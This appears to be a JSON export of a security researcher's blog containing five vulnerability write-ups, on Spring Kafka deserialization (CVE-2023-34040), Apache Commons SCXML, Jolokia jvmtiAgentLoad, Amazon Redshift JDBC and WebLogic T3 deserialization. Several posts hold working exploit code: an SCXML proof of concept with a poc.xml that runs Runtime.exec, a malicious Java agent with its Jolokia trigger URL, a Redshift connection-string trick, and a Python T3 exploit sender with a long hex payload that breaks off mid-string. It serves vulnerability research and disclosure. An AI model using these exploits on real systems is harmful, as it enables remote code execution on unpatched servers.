{"meta":{"title":null,"subtitle":"","description":null,"author":"by pyn3rd","url":"http://yoursite.com","root":"/"},"pages":[{"title":"about","date":"2022-10-12T01:59:54.000Z","updated":"2022-10-12T01:59:54.864Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2022-10-11T02:47:37.579Z","updated":"2022-10-11T02:30:17.920Z","comments":false,"path":"repository/index.html","permalink":"http://yoursite.com/repository/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-10-12T02:26:35.232Z","updated":"2022-10-12T02:26:35.228Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"Search","date":"2022-10-12T02:06:40.192Z","updated":"2022-10-12T02:06:40.187Z","comments":true,"path":"search/index.html","permalink":"http://yoursite.com/search/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-10-12T02:09:08.400Z","updated":"2022-10-12T02:09:08.392Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"CVE-2023-34040 Spring Kafka Deserialization Remote Code Execution","slug":"CVE-2023-34040-Spring-Kafka-Deserialization-Remote-Code-Execution","date":"2023-09-15T15:29:23.000Z","updated":"2023-09-16T09:48:18.119Z","comments":true,"path":"2023/09/15/CVE-2023-34040-Spring-Kafka-Deserialization-Remote-Code-Execution/","link":"","permalink":"http://yoursite.com/2023/09/15/CVE-2023-34040-Spring-Kafka-Deserialization-Remote-Code-Execution/","excerpt":"","text":"0x01 PrefaceHere is the explicit description about Spring Kafka deserialization vulnerability in Vmware security bulletin. Reference https://spring.io/security/cve-2023-34040 According to the description in security bulletin, we can simply attain some critical points resulting in the vulnerability. Setting the ErrorHandlingDeserializer as a key and/or value in the Kafka record in configuration. Setting the boolean type properties checkDeserExWhenKeyNull and/or checkDeserExWhenValueNull to true. The users can publish a Kafka topic without any verification. 0x02 Concepts of KafkaBefore deeply diving into the vulnerability, we promptly review some relevant concepts of the Kafka service. Producer：we call the object for publishing record Kafka topic producer Topic：The records are classified by the Kafka service, and each classification is named Topic. Broker：The published messages are stored in a group of servers, we call it Kafka cluster. Each of the server is a Broker. The consumer can attain the data form Broker and consume more than one topic. Consumer：The object which is used to subscribe message and handle with the published message is called Kafka topi consumer. The consumption messages are topic based. Moreover,it is necessary to review the structure of Kafka record. Kafka Record, we also call it Message or Event consisting of Header and Body. The header data virtually equals to Metadata including the basic elements like Topic, Patition and Timestamp. They are stored as a pair of key/value. The body data usually are the relevant business data stored as key/value constructure as well. PreparationZookeeper server is required before deploying Kafka service. 1.Installing Zookeeper server by docker 1docker run -d --name zookeeper -p 2181:2181 -t zookeeper:latest 2.Deploying Kafka server by docker 123456docker run -d --name kafka -p 9092:9092 \\-e KAFKA_ZOOKEEPER_CONNECT=192.168.5.102:2181 \\-e KAFKA_ADVERTISED_LISTENERS=PLAINTEXT://192.168.5.102:9092 \\-e KAFKA_LISTENERS=PLAINTEXT://0.0.0.0:9092 \\-e TZ=&quot;Asia/Shanghai&quot; \\wurstmeister/kafka:latest 3.Spring Boot project imports the affected Kafka dependencies Affected version： 2.8.1 to 2.9.10 3.0.0 to 3.0.9 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.kafka&lt;/groupId&gt; &lt;artifactId&gt;spring-kafka&lt;/artifactId&gt; &lt;version&gt;2.8.11&lt;/version&gt; &lt;/dependency&gt; 4.Updating the configuration in application.yaml 5.Classes for demonstration 1）Kafka Producer Class 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package com.example.SpringKafkaDemo.producer;import com.example.SpringKafkaDemo.model.KafkaMessage;import org.apache.kafka.clients.producer.ProducerRecord;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.kafka.core.KafkaTemplate;import org.springframework.web.bind.annotation.*;import java.util.HashMap;@RestControllerpublic class KafkaProducer &#123; @Autowired private KafkaTemplate&lt;String, String&gt; kafkaTemplate; @PostMapping(&quot;/message/send&quot;) public String sendMessage(@RequestBody KafkaMessage message) &#123; String topic = message.getTopic(); String data = message.getData(); HashMap&lt;String, String&gt; headers = message.getHeaders(); ProducerRecord&lt;String, String&gt; producerRecord = new ProducerRecord&lt;&gt;(topic, data); for (String s : headers.keySet()) &#123; if (s.equals(&quot;springDeserializerExceptionKey&quot;)) &#123; String exceptData = headers.get(s); byte[] exceptHandler = KafkaProducer.hexStringtoBytes(exceptData); producerRecord.headers().add(s, exceptHandler); continue; &#125; producerRecord.headers().add(s, headers.get(s).getBytes()); &#125; kafkaTemplate.send(producerRecord); String jsonString=&quot;&#123;\\&quot;code\\&quot;:\\&quot;200\\&quot;, \\&quot;status\\&quot;:\\&quot;success\\&quot;&#125;&quot;; return jsonString; &#125; private static byte[] hexStringtoBytes(String hexString) &#123; byte[] excepetionMessage = new byte[hexString.length() / 2]; for (int i = 0; i &lt; excepetionMessage.length; i++) &#123; excepetionMessage[i] = (byte) Integer.parseInt(hexString.substring(i * 2, i * 2 + 2), 16); &#125; return excepetionMessage; &#125;&#125; By the way, here we use a type of design pattern in Java Language, Template Method Pattern. In this demonstration, I insert a template named kafkaTemplate. Highlight of the code fragment 1private KafkaTemplate&lt;String, String&gt; kafkaTemplate; 2）Kafka Consumer Class 1234567891011121314package com.example.SpringKafkaDemo.consumer;import org.springframework.kafka.annotation.KafkaListener;import org.springframework.stereotype.Service;@Servicepublic class KafkaConsumer &#123; @KafkaListener(topics = &quot;my-topic&quot;, groupId = &quot;my-group-id&quot;) public void consume(String message) &#123; System.out.println(&quot;Received message: &quot; + message); &#125;&#125; 3）Config Class for the Consumer 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package com.example.SpringKafkaDemo.config;import org.apache.kafka.clients.consumer.ConsumerConfig;import org.springframework.beans.factory.annotation.Value;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.kafka.annotation.EnableKafka;import org.springframework.kafka.config.ConcurrentKafkaListenerContainerFactory;import org.springframework.kafka.core.ConsumerFactory;import org.springframework.kafka.core.DefaultKafkaConsumerFactory;import org.springframework.kafka.support.serializer.JsonDeserializer;import java.util.HashMap;import java.util.Map;@Configuration@EnableKafkapublic class KafkaConsumerConfig &#123; @Value(&quot;$&#123;spring.kafka.bootstrap-servers&#125;&quot;) private String bootstrapServers; @Value(&quot;$&#123;spring.kafka.consumer.group-id&#125;&quot;) private String groupId; @Bean public Map&lt;String, Object&gt; consumerConfigs() &#123; Map&lt;String, Object&gt; props = new HashMap&lt;&gt;(); props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers); props.put(ConsumerConfig.GROUP_ID_CONFIG, groupId); props.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, &quot;earliest&quot;); props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, JsonDeserializer.class); props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, JsonDeserializer.class); return props; &#125; @Bean public ConsumerFactory&lt;String, String&gt; consumerFactory() &#123; return new DefaultKafkaConsumerFactory&lt;&gt;(consumerConfigs()); &#125; @Bean public ConcurrentKafkaListenerContainerFactory&lt;String, String&gt; kafkaListenerContainerFactory() &#123; ConcurrentKafkaListenerContainerFactory&lt;String, String&gt; factory = new ConcurrentKafkaListenerContainerFactory&lt;&gt;(); factory.setConsumerFactory(consumerFactory()); factory.getContainerProperties().setCheckDeserExWhenKeyNull(true); factory.getContainerProperties().setCheckDeserExWhenValueNull(true); return factory; &#125;&#125; In acordance with the vulnerablity description in official bulletin, we should set both the checkDeserExWhenKeyNull and checkDeserExWhenValueNull properties to true. 12factory.getContainerProperties().setCheckDeserExWhenKeyNull(true)factory.getContainerProperties().setCheckDeserExWhenValueNull(true) Se the breakpoint at the getExceptionFromHeader function and then have the server start. Step into invokeIfHaveRecords function, the record object will be deserialized. Back to the getExceptionFromHeader function. This function makes the value springDeserializerExceptionKey of record.headers() into the the value of the variables headerName and be delivered header. And then deliver the value to byteArrayToDeserializationException function. Step into byteArrayToDeserializationException function. The resolveClass function is overrided to restrain arbitrary Java class deserialization. Actually, we can find the way of preventing Java deserialization vulnerability in many projects, like Apache Shiro, Fastjson. Apparently, only the classorg.springframework.kafka.support.serializer.DeserializationException can be deserialized. Step into DeserializationException function, it consists four arguments. One of them is cause which is used to invoke instantial class. Write a malicious class and make it inherit the parent class Throwable. Eventually, fill the value of the springDeserializerExceptionKey key in JSON data with the generated Java serialization. The remote code execution is trigged after send the HTTP request.","categories":[],"tags":[],"author":"by pyn3rd"},{"title":"Apache Commons SCXML Remote Code Execution","slug":"Apache-Commons-SCXML-Remote-Code-Execution","date":"2023-02-06T09:18:00.000Z","updated":"2023-02-17T08:11:47.551Z","comments":true,"path":"2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/","link":"","permalink":"http://yoursite.com/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/","excerpt":"","text":"0x01 Preface What is Apache Commons SCXML? Here is the Apache offical explanation. State Chart XML (SCXML) is currently a Working Draft specification published by the World Wide Web Consortium (W3C). SCXML provides a generic state-machine based execution environment based on Harel State Tables. SCXML is a candidate for the control language within multiple markup languages coming out of the W3C (see the latest Working Draft for details). Commons SCXML is an implementation aimed at creating and maintaining a Java SCXML engine capable of executing a state machine defined using a SCXML document, while abstracting out the environment interfaces. 0x02 How to find itWhen I audited the source code, I unintentionally found out a sensitive class named SCXMLReader. Then I kept on analysing the critical class SCXMLReader. The class consisted of serveral static methods, one of them named read, it could load a XML file by the parameter scxmlPath. However, the method did not verify the legal resource of the XML file, in the other words, it could load a XML file from any untrustworthy resource. Next, I stepped into the readInternal method, it tried to resovle the URL of the XML file. Obviously, it did not restrict the loading resource, and a remote resource can also be initialized. Then, I stepped into the getReader method, it tried to load the XML stream as input. If there is a URL as file path, the input stream will obtain from the URL resource. The XML stream will be returned finally. Next, I definitely should utilize some method to handle with the XML stream, here I convinced myself the method called setStateMachine was what I needed. Then I stepped into the method. We can see the initialization of the instance. At last, the instance was intialized and the Java Expression Lauguage in XML file was be executed by getEvaluator method. 0x03 Proof of ConceptBy convention, I eventually demostrate it with the completed PoC. 12345678910111213141516171819202122import org.apache.commons.scxml2.SCXMLExecutor;import org.apache.commons.scxml2.io.SCXMLReader;import org.apache.commons.scxml2.model.ModelException;import org.apache.commons.scxml2.model.SCXML;import javax.xml.stream.XMLStreamException;import java.io.IOException;public class SCXMLDemo &#123; public static void main(String[] args) throws ModelException, XMLStreamException, IOException &#123; // engine to execute the scxml instance SCXMLExecutor executor = new SCXMLExecutor(); // parse SCXML URL into SCXML model SCXML scxml = SCXMLReader.read(&quot;http://127.0.0.1:8000/poc.xml&quot;); // set state machine (scxml instance) to execute executor.setStateMachine(scxml); executor.go(); &#125;&#125; poc.xml 12345678910&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;&lt;state id=&quot;run&quot;&gt;&lt;onentry&gt;&lt;script&gt;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;open -a calculator&#x27;)&lt;/script&gt;&lt;/onentry&gt;&lt;/state&gt;&lt;/scxml&gt; The screenshot of this illustration.","categories":[],"tags":[],"author":"by pyn3rd"},{"title":"A New Way of Jolokia Remote Code Execution","slug":"A-New-Way-of-Jolokia-Remote-Code-Execution","date":"2022-11-15T03:18:46.000Z","updated":"2023-02-23T02:22:05.882Z","comments":true,"path":"2022/11/15/A-New-Way-of-Jolokia-Remote-Code-Execution/","link":"","permalink":"http://yoursite.com/2022/11/15/A-New-Way-of-Jolokia-Remote-Code-Execution/","excerpt":"","text":"0x01 PrefaceLast week, I saw an interesting case about JDBC attack reported by @JJaaskela in HackerOne. It caught my attention, so I intended to analyse this case. Here is the link of this report: https://hackerone.com/reports/1547877 Due to the bug fix, I cannot reproduce the vulnerablity. But I still can obtain some clues according to the description of this report. Aiven is a next-generation managed cloud database service that hosts your software infrastructure services. It supports diverse kinds of data sources, like Apache Kafka, PostgresSQL, MySQL, Redis, etc. Obviously, JDBC connections exist in these scenarios. The root causes of this vulnerablity are as follow: The reporter found the service supported Jolokia service according to the logs in web console, and the HTTP sink connector allowed user to send HTTP request to localhost, Jolokia service was listening on localhost:6725 as well. JMX exposes the Mbean called com.sun.management:type=DiagnosticCommand, it has a special operation named jvmtiAgentLoad. The HTTP Sink Connector did not verify the data source target whether or not a local resource, so we can utilized the operation jvmtiAgentLoad to load a local jar file. In this case the jar file is the SQLite database file. Loading classAs we know, we can use different ClassLoaders to load java classes from diverse origins. The main origins as follow: Loading .class file from local system directly, which is the loading method of most classes. Loading .class file from archives such as zip, jar, etc. Loading .class file or data through the network. Extract .class file from proprietary databases. Upload the Java source file to the server, dynamically compile it into .class file and perform loading. So we can create a malicious jar file and then insert the jar file data into the SQLite database as the BLOB data type. 0x02 About JolokiaFirst of all , let’s review the Jolokia concept and its historical vulnerablities. Jolokia is a JMX-HTTP bridge giving an alternative to JSR-160 connectors. It is an agent based approach with support for many platforms. In addition to basic JMX operations it enhances JMX remoting with unique features like bulk requests and fine grained security policies. In the past days, there are several security researchers have shared their findings about Jolokia.They disclose a lot of weaknesses that exist in the Jolokia component. If you are interested in the vulnerabilities, you could review their write-ups. https://www.veracode.com/blog/research/exploiting-spring-boot-actuators https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/ I’m sure you’re aware Jololia often exposes many Mbeans, many of which are utilized to triger remote code execution vulnerabilities. In this case, we talk about the Mbean named com.sun.management:type=DiagnosticCommand 0x03 JVMTI &amp; InstrumentIn this case, Jolokia exposes the com.sun.management:type=DiagnosticCommand MBean, it has a risky operation named jvmtiAgentLoad. So what is JVMTI? JVMTI(JVM Tool Interface) which is the native interface provided by the java virtual machine. JVMTI is just a set of interfaces. If we want to develope JVM tools, we need to write an agent programme to use these interfaces. Agent programme is atually a C or C++ language written dynamic link library. So loading a malicious .so file can lead remote code exection. However, Java introduced Instrumentation since in JDK 5. Using Instrumentation interface, we can call the dynamic library of libinstrument through Java code to interact with the JVMTI interface, eliminating the need to develop native dynamic link library files. The Instrument mechanism includes two integration forms: one is the main method is executed before startup, and the other is the main method is loaded internally through attach. premain (Agent mode): Main method is invoked before the target application starting. 1java -javaagent:/path/to/javaagent.jar -jar application.jar The argument -javaagent needs to be in front of -jar. Otherwise, it will not take effect. 12public static void premain(String agentArgs, Instrumentation inst);public static void premain(String agentArgs); The premain method is relatively simple. It’s a jar file of the java agent. After adding this jar to the startup command, the premain method will be run before the main method is started. It should be noted that to make the jar file know which premain method to start, we also need to define it in the manifest file. There are also two ways to define a menifast. One is to write a menifast file directly, and the other is to use Maven’s plug-in to write it. agentmain(Attach mode): In addition to the target application, use an attach application to inject javaagent.jar into the target application. 12public static void agentmain(String agentArgs, Instrumentation inst);public static void agentmain(String agentArgs); The attach method is relatively troublesome. You need to set up a separate application (or use a different thread), find all running VirtualMachineDescriptors through VirturalMachine. list(), match them to the target application, and then inject javaagent.jar into the target application. If you have known the above knowledge, it is not difficult to realize using the jvmtiAgentLoadoperation of com.sun.management:type=DiagnosticCommand mbean，we can inject malicious java agent into the application by attach mode without restarting target application. 0x04 Create malicious Jar fileFirstly, the JDK provides two static methods, premain and agentmain, which can be used directly. Here I use the agentmain method. If you create MANIFEST.MF manually, you need to specify the Agent-Class, and finally build the jar file. It should be noted here that if a standard so file supported by JVMTI is called, there will be an error. &quot;Agent_OnAttach is not available in /tmp/ext.so &quot; The reason is that the JVMTI is invoked through the Agent_ OnAttach as the entry function, and then execute the following process to load the Java agent. Get JNIEnv to ensure that it has been successfully attached to the Java process. Create and initialize JPLISAgent, then make VMInit monitoring (it will not be triggered), and the logic is the same as OnLoad. Read Agent-Class and load it. Read the META-INFO related configuration and set the mRetransformEnvironment ClassFileLoadHook listening. The logic is the same as OnLoad. Create an InstrumentationImpl instance. Set the mNormaltransformEnvironment ClassFileLoadHook listening Execute AgentMain method The Java agent code as follow: 12345678910111213141516public class JavaAgent &#123; private static final String RCE_COMMAND = &quot;open -a calculator&quot;; public static void cmd() &#123; try &#123; Runtime.getRuntime().exec(RCE_COMMAND); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; public static void agentmain(String args, Instrumentation inst) &#123; System.out.println(&quot;In JavaAgent Agentmain&quot;); cmd(); &#125; &#125; Inject malicious jar file stream into database fileJust use the JDBC Sink Connector feature.When establishing the SQLite JDBC connecting , a SQLite database file is created automatically, then insert the malicious jar file data into the database table. According the Oracle official document definition: We can clearly know that the jar file is a kind of archives, like zip, tar,etc. It has no restriction about the file name.Consequently we can embed the jar files in other files just like zip files, without affecting their normal usage. Eventually,when the SQLite database file exists in the local disk, using jvmtiAgentLoad operation to load the specified jar file. Final InllustrationOwing to the vulnerability being fixed, I set up a local environment to reproduce it. Inject malicious Java agent into SQLite database file During JDBC connection, if the database file does not exist ever, a SQLite database file foo.jar will be automatically created through the getConnection method of DriverManager and then create a table through the other corresponding SQL statement. Write the malicious Java agent into the database as Blob data type. In my illustration, I write the malicious agent.jar into the SQLite database file test.jar. Load Java agent 1http://127.0.0.1:8099/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/tmp!/agent.jar Successfully attach the malicious Java agent and complete the RCE","categories":[],"tags":[],"author":"by pyn3rd"},{"title":"Amazon Redshift JDBC Attack Trick","slug":"Amazon-Redshift-JDBC-Driver-Trick","date":"2022-06-29T14:24:15.000Z","updated":"2022-10-17T02:42:49.988Z","comments":true,"path":"2022/06/29/Amazon-Redshift-JDBC-Driver-Trick/","link":"","permalink":"http://yoursite.com/2022/06/29/Amazon-Redshift-JDBC-Driver-Trick/","excerpt":"","text":"Amazon Redshift JDBC Driver supports plenty of properties as well. https://docs.aws.amazon.com/redshift/latest/mgmt/options-for-providing-iam-credentials.html However, there are two special properties plugin_name and login_url. The plugin_name is used for providing IAM credentials. The Amazon Redshift JDBC driver includes SAML-based credential provider plugins. One of the plugins is for SAML MFA , the plugin class named com.amazon.redshift.plugin.BrowserSamlCredentialsProvider So set the breakpoint at the method openBrowser() of BrowserSamlCredentialsProvider class Apparently , the value of the property login_url steps into the method Desktop.getDesktop().browse() As we know, the method Desktop.getDesktop().browse() of the package java.awt will launch the default browser to display URI. Here is the sample for explanation Consequently, just set file:///System/Applications/Calculator.app as the value of property login_url, the default browser will display it. Here is the PoC 1234567891011121314import java.sql.DriverManager;import java.sql.SQLException;public class RedshiftDemo &#123; public static void main(String[] args) throws SQLException &#123; System.out.println(&quot;Amazon Redshift Driver Version: &quot; + com.amazon.redshift.jdbc42.Driver.class.getPackage().getSpecificationVersion()); DriverManager.registerDriver(new com.amazon.redshift.jdbc42.Driver()); DriverManager.getConnection(&quot;jdbc:redshift:iam://mycluster:us-west-2/dev?plugin_name=com.amazon.redshift.plugin.BrowserSamlCredentialsProvider&amp;login_url=file:///System/Applications/Calculator.app&quot;); &#125;&#125; Make JDBC Attacks Brilliant Again!","categories":[],"tags":[],"author":"pyn3rd"},{"title":"Weblogic SSRF via Deserialized Oracle JDBC Connection","slug":"Weblogic-SSRF-Involving-Deserialized-JDBC-Connection","date":"2022-06-18T05:55:42.000Z","updated":"2023-08-17T07:36:43.282Z","comments":true,"path":"2022/06/18/Weblogic-SSRF-Involving-Deserialized-JDBC-Connection/","link":"","permalink":"http://yoursite.com/2022/06/18/Weblogic-SSRF-Involving-Deserialized-JDBC-Connection/","excerpt":"","text":"0x01 ForewordsAs you know, I have researched the JDBC attacks for a long time. So I focus on the various attacks involving JDBC drivers. Today I write a short write-up about another way of JDBC attacking. 0x02There is a private method readObject in the class oracle.jdbc.pool.OraclePooledConnection of ojdbc driver. Debug step by step, you will find it trying to establish a JDBC connection with deserializing the serialized stream. Here I post the key steps. 0x03 PoC for Testingweblogic.py 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/pythonimport socketimport osimport sysimport structif len(sys.argv) &lt; 3: print(&#x27;Usage: python &#123;&#125; &lt;TARGET_HOST&gt; &lt;PORT&gt; &lt;/PATH/TO/PAYLOAD&gt;&#x27;.format(os.path.basename(sys.argv[0]))) sys.exit()sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)sock.settimeout(5)server_address = (sys.argv[1],int(sys.argv[2]))sys.stderr.write(&#x27;&#123;&#125; [+] Connecting to &#123;&#125; &#x27;.format(&#x27;\\r\\n&#x27;,server_address))sock.connect(server_address)# Send headersheaders=b&#x27;t3 10.3.6\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n&#x27;sys.stderr.write(&#x27;&#123;&#125; Sending &#123;&#125;&#x27;.format(&#x27;\\r\\n&#x27;,headers))sock.sendall(headers)data = sock.recv(1024)sys.stderr.write(&#x27;&#123;&#125; Received &#123;&#125;&#x27;.format(&#x27;\\r\\n&#x27;,data))payloadObj = open(sys.argv[3],&#x27;rb&#x27;).read()payload=b&#x27;\\x00\\x00\\x09\\xf3\\x01\\x65\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x71\\x00\\x00\\xea\\x60\\x00\\x00\\x00\\x18\\x43\\x2e\\xc6\\xa2\\xa6\\x39\\x85\\xb5\\xaf\\x7d\\x63\\xe6\\x43\\x83\\xf4\\x2a\\x6d\\x92\\xc9\\xe9\\xaf\\x0f\\x94\\x72\\x02\\x79\\x73\\x72\\x00\\x78\\x72\\x01\\x78\\x72\\x02\\x78\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x70\\x70\\x70\\x70\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x06\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x01\\x00\\x00&#x27;payload=payload+payloadObjpayload=payload+b&#x27;\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x21\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x65\\x65\\x72\\x49\\x6e\\x66\\x6f\\x58\\x54\\x74\\xf3\\x9b\\xc9\\x08\\xf1\\x02\\x00\\x07\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x74\\x00\\x27\\x5b\\x4c\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2f\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2f\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2f\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\x3b\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x97\\x22\\x45\\x51\\x64\\x52\\x46\\x3e\\x02\\x00\\x03\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0e\\x72\\x65\\x6c\\x65\\x61\\x73\\x65\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x12\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x41\\x73\\x42\\x79\\x74\\x65\\x73\\x74\\x00\\x02\\x5b\\x42\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x05\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x00\\xff\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x46\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\x00\\x0b\\x75\\x73\\x2d\\x6c\\x2d\\x62\\x72\\x65\\x65\\x6e\\x73\\xa5\\x3c\\